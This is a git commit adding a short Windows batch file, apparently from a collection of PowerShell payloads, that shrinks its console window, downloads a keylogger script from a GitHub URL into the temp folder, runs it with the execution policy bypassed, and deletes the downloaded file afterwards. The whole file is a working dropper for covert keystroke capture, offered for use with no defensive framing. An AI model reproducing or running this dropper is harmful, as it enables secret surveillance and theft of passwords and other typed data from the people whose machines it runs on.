8b164d55ca6ef364d6ae8dc7a916f46a38482d1d
Subhranshu Choudhury <63858190+subhranshuchoudhury@users.noreply.github.com>
2022-01-07 16:36:47 +0530

    Create 5. Send powershell as batch.bat

---
+++ 5. Send powershell as batch.bat
@@ -0,0 +1,7 @@
+@echo off
+mode con:cols=30 lines=1
+cd %temp%
+Invoke-WebRequest -OutFile klogger.ps1 -Uri https://raw.githubusercontent.com/subhranshuchoudhury/Powershell_Payloads/main/3.%20Keylogger.ps1
+powershell -executionpolicy bypass -File .\klogger.ps1
+del klogger.ps1 /f /s /q
+exit
